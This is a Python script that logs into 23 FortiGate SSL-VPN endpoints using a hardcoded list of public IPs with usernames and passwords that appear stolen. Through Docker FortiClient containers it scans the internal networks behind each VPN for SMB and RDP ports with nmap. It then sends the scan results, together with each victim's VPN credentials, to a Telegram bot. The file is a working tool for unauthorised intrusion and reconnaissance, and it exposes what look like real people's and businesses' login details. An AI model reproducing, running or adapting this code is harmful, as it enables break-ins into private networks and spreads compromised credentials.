
import requests
import time
import logging
import xmltodict
import json

# Constants
DOCKER_IMAGE = "auchandirect/forticlient"
TELEGRAM_API_KEY = "9k0zc03hSIqo"  # 
CHAT_IDS = ["", ""]



def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_API_KEY}/sendMessage"
    payload = {
        "chat_id": CHAT_IDS,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # To ensure any request error is caught
        logging.info("Message sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending message to Telegram: {e}")

# Container Configuration
CONTAINERS = [

{"name": "98.191.254.250", "ip": "172.20.5.224", "user": "msadmin", "vpnaddr": "98.191.254.250:443", "pass": "F@stB@ll!-p2k"},
{"name": "98.4.177.199", "ip": "172.20.5.225", "user": "JoeS", "vpnaddr": "98.4.177.199:4443", "pass": "05!NodoT!1129"},
{"name": "98.5.116.31", "ip": "172.20.5.226", "user": "ummknarf", "vpnaddr": "98.5.116.31:8443", "pass": "226e8e89"},
{"name": "98.58.19.36", "ip": "172.20.5.227", "user": "Innovative", "vpnaddr": "98.58.19.36:10443", "pass": "ILrocksscott!"},
{"name": "98.7.42.57", "ip": "172.20.5.228", "user": "itsupport", "vpnaddr": "98.7.42.57:10443", "pass": "n3wp4ssw0rd!"},
{"name": "98.7.43.186", "ip": "172.20.5.229", "user": "itsupport", "vpnaddr": "98.7.43.186:10443", "pass": "123456"},
{"name": "98.7.83.199", "ip": "172.20.5.230", "user": "itsupport", "vpnaddr": "98.7.83.199:10443", "pass": "itsupport36485"},
{"name": "98.97.104.2", "ip": "172.20.5.231", "user": "lhillen", "vpnaddr": "98.97.104.2:10443", "pass": "Water2Hill@port"},
{"name": "99.101.180.252", "ip": "172.20.5.232", "user": "konrad", "vpnaddr": "99.101.180.252:4433", "pass": "Joliet!9962"},
{"name": "99.165.195.245", "ip": "172.20.5.233", "user": "Emily", "vpnaddr": "99.165.195.245:443", "pass": "123456"},
{"name": "99.165.195.245", "ip": "172.20.5.234", "user": "KimT", "vpnaddr": "99.165.195.245:443", "pass": "Vp#Kt2SFO"},
{"name": "99.165.9.73", "ip": "172.20.5.235", "user": "BillLongtin", "vpnaddr": "99.165.9.73:10443", "pass": "Newst@rt2"},
{"name": "99.208.65.98", "ip": "172.20.5.236", "user": "liamwilkins", "vpnaddr": "99.208.65.98:10443", "pass": "3G8w8nDn"},
{"name": "99.208.65.98", "ip": "172.20.5.237", "user": "motheitguy", "vpnaddr": "99.208.65.98:10443", "pass": "JC4mo!"},
{"name": "99.209.66.110", "ip": "172.20.5.238", "user": "turple", "vpnaddr": "99.209.66.110:9443", "pass": "Porsche91!"},
{"name": "99.228.125.102", "ip": "172.20.5.239", "user": "altannan1", "vpnaddr": "99.228.125.102:10443", "pass": "Internet@123"},
{"name": "99.233.199.50", "ip": "172.20.5.240", "user": "eric@bigbaydental.ca", "vpnaddr": "99.233.199.50:10443", "pass": "hGTXg2dh"},
{"name": "99.238.76.252", "ip": "172.20.5.241", "user": "stephen", "vpnaddr": "99.238.76.252:10443", "pass": "letmein"},
{"name": "99.245.111.16", "ip": "172.20.5.242", "user": "Comp", "vpnaddr": "99.245.111.16:4443", "pass": "Gym05$"},
{"name": "99.251.79.64", "ip": "172.20.5.243", "user": "Daniel", "vpnaddr": "99.251.79.64:4433", "pass": "Jesus4646"},
{"name": "99.29.116.32", "ip": "172.20.5.244", "user": "payzero", "vpnaddr": "99.29.116.32:8443", "pass": "Iamth3b0ss!"},
{"name": "99.50.204.104", "ip": "172.20.5.245", "user": "sslvpnuser", "vpnaddr": "99.50.204.104:443", "pass": "P@$$w0rddd"},
{"name": "99.88.164.168", "ip": "172.20.5.246", "user": "yatznet", "vpnaddr": "99.88.164.168:10443", "pass": "spl!tTunn3l"}




]

# Logging Configuration
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),  # Console output
        logging.FileHandler("container_management.log")  # Log file
    ]
)


def run_container(container):
    """Run Docker container with specified parameters."""
    try:
        subprocess.run(["docker", "stop", container["name"]], check=True)
        subprocess.run(["docker", "rm", container["name"]], check=True)
        logging.info(f"Removed existing container {container['name']}.")
    except subprocess.CalledProcessError:
        logging.warning(f"No existing container to remove {container['name']} or it is already stopped.")

    cmd = [
        "docker", "run", "-d", "--name", container["name"],
        "--cap-add=NET_ADMIN", "--cap-add=SYS_MODULE", "--privileged",
        "--net", "forti", "--ip", container["ip"],
        "-e", f"VPNADDR={container['vpnaddr']}",
        "-e", f"VPNUSER={container['user']}",
        "-e", f"VPNPASS={container['pass']}", "-e", "VPNTIMEOUT=60",
        DOCKER_IMAGE
    ]
    try:
        subprocess.run(cmd, check=True)
        logging.info(f"Container {container['name']} successfully started.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error starting container {container['name']}: {e}")


def get_routing_table(container_name):
    """Get routing table for the specified container."""
    for _ in range(3):  # Retry mechanism
        try:
            result = subprocess.run(
                ["docker", "exec", container_name, "ip", "route"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True
            )
            logging.info(f"Routing table for {container_name}:\n{result.stdout.strip()}")
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            logging.warning(f"Error getting routing table for {container_name}: {e}")
            time.sleep(5)
    return f"Failed to get routing table for {container_name}."


def check_interface_exists(container_name, interface_name="ppp0"):
    """Check for the existence of the interface in the container."""
    result = subprocess.run(
        ["docker", "exec", container_name, "ip", "link", "show", interface_name],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    exists = interface_name in result.stdout
    logging.info(f"Interface {interface_name} {'exists' if exists else 'not found'} in container {container_name}.")
    return exists


def get_interface_cidr(container_name):
    """Get all CIDRs for interface ppp0 in the container using 'ip route'."""
    cidrs = []  # List to store multiple CIDRs
    
    if check_interface_exists(container_name):
        for _ in range(5):  # Retry attempts
            try:
                routing_table = get_routing_table(container_name)

                # Parse the routing table to find lines related to ppp0
                for line in routing_table.splitlines():
                    if 'ppp0' in line:
                        cidr = line.split()[0]  # Get the CIDR part of the line
                        cidrs.append(cidr)
                        logging.info(f"Received CIDR for {container_name}: {cidr}")
                
                # If at least one CIDR was found, return them
                if cidrs:
                    return cidrs
                
                # Log if no CIDR was found for ppp0
                logging.warning(f"No CIDRs found for interface ppp0 in {container_name}.")
                
            except subprocess.CalledProcessError as e:
                logging.warning(f"Error getting CIDR for {container_name}: {e}")
                time.sleep(5)
    else:
        logging.warning(f"Interface ppp0 not found in container {container_name}. Moving to the next container.")

    return None  # Return None if no CIDR was found


def install_nmap(container_name):
    """Install nmap in the container."""
    try:
        subprocess.run(["docker", "exec", container_name, "apt-get", "update"], check=True)
        #subprocess.run(["docker", "exec", container_name, "apt-get", "install", "python3-nmap", "-y"], check=True)
        subprocess.run(["docker", "exec", container_name, "apt-get", "install", "nmap", "-y"], check=True)
        subprocess.run(["docker", "exec", container_name, "apt-get", "install", "jq", "-y"], check=True)
        #subprocess.run(["docker", "exec", container_name, "pip3", "install", "xmltodict"], check=True)
        logging.info(f"nmap installed successfully in {container_name}.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error installing nmap in {container_name}: {e}")
        return False
    return True



def send_file_to_telegram(file_path):
    """Send a file to Telegram for all chat IDs."""
    url = f"https://api.telegram.org/bot{TELEGRAM_API_KEY}/sendDocument"
    
    # Iterate over all chat IDs
    for chat_id in CHAT_IDS:
        payload = {
            "chat_id": chat_id
        }

        with open(file_path, 'rb') as file:
            try:
                response = requests.post(url, data=payload, files={"document": file})
                response.raise_for_status()  # Raise an exception for HTTP errors
                logging.info(f"File {file_path} successfully sent to Telegram chat {chat_id}.")
            except requests.exceptions.RequestException as e:
                logging.error(f"Failed to send file {file_path} to Telegram chat {chat_id}: {e}")


def perform_nmap_scan(container, cidr):
    specific_ports = "445,139,3389"
    
    # Nmap arguments with added options for OS detection (-O), service version (-A), and SMB authentication script
    scan_args = f"-sV -T5 -p {specific_ports} --open --script nbstat.nse -v"
    
    try:
        logging.info(f"Starting Nmap scan for {container['name']} with CIDR {cidr} and arguments {scan_args}")

        # Run the nmap command within the Docker container
        docker_nmap_command = f"docker exec {container['name']} nmap {scan_args} {cidr} -oX -"
        
        # Execute the command
        result = subprocess.run(docker_nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Check for errors
        if result.returncode != 0:
            logging.error(f"Nmap scan failed for {container['name']} with CIDR {cidr}. Error: {result.stderr}")
            send_to_telegram(f"Nmap scan failed for {container['name']} with CIDR {cidr}. Error: {result.stderr}")
            return None

        # Parse the XML output from nmap
        nmap_xml = result.stdout
        nmap_dict = xmltodict.parse(nmap_xml)

        # Convert XML data to JSON
        nmap_json = json.dumps(nmap_dict, indent=4)

        # Process JSON output to extract 'host' details using jq
        jq_command = "jq .nmaprun.host"
        jq_output = subprocess.run(jq_command, input=nmap_json, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if jq_output.returncode != 0:
            logging.error(f"Error processing JSON with jq: {jq_output.stderr}")
            send_to_telegram(f"Error processing Nmap JSON for {container['name']} with CIDR {cidr}.")
            return None

        # Parse the processed output
        nmap_results = json.loads(jq_output.stdout)

        # Check if there are any hosts up
        if not nmap_results:
            logging.info(f"No 'up' hosts found for {container['name']} with CIDR {cidr}.")
            send_to_telegram(f"No 'up' hosts found for {container['name']} with CIDR {cidr}.")
            return None

        # Prepare a summary and detailed results for output
        detailed_results = json.dumps(nmap_results, indent=4)
        detailed_lines = detailed_results.splitlines()
        last_lines = "\n".join(detailed_lines[-50:])

        # Add a summary line
        nmap_summary_line = "Nmap scan completed"
        last_lines = f"{last_lines}\n{nmap_summary_line}"

        # Gather container info
        container_info = {
            "Container Name": container["name"],
            "Container IP": container["ip"],
            "VPN Address": container["vpnaddr"],
            "User": container["user"],
            "Password": container["pass"],
            "CIDR": cidr,
        }

        # Format the message for Telegram
        extended_info_message = f"""<b>Container Information:</b>
        <pre>{json.dumps(container_info, indent=4)}</pre>
        
        <b>Last 50 Lines of Nmap Scan Results:</b>
        <pre>{last_lines}</pre>
        """

        # Send the message to Telegram
        send_to_telegram(extended_info_message)

        # Save results to a file
        result_file_path = f"nmap_results_{container['name']}_{cidr.replace('/', '_')}.json"
        with open(result_file_path, "w") as f:
            f.write(detailed_results)

        # Send the file to Telegram
        send_file_to_telegram(result_file_path)

        return nmap_results

    except Exception as e:
        logging.error(f"Error performing Nmap scan for container {container['name']} with CIDR {cidr}: {e}")
        send_to_telegram(f"Error performing Nmap scan for container {container['name']} with CIDR {cidr}: {e}")
        return None


def process_container(container):
    """Process the container: start, get all CIDRs, install nmap, and perform scans on each CIDR."""
    # Start the container
    run_container(container)

    # Wait for the network connection to establish
    time.sleep(20)

    # Retrieve all CIDRs associated with the interface in the container
    cidrs = get_interface_cidr(container["name"])
    
    if cidrs:
        # Install nmap once in the container if it's not already installed
        if install_nmap(container["name"]):
            for cidr in cidrs:
                # Check if the CIDR is valid (contains a '/')
                if "/" in cidr:
                    # Perform Nmap scan for each CIDR using the optimized version
                    perform_nmap_scan(container, cidr)  
                else:
                    logging.warning(f"CIDR for {container['name']} is invalid or empty: {cidr}")
                    send_to_telegram(f"CIDR for {container['name']} is invalid or empty: {cidr}")
    else:
        logging.warning(f"No CIDRs found for {container['name']}.")
        send_to_telegram(f"No CIDRs found for {container['name']}.")


def main():
    """Main function to process each container."""
    for container in CONTAINERS:
        process_container(container)

if __name__ == "__main__":
    main()  
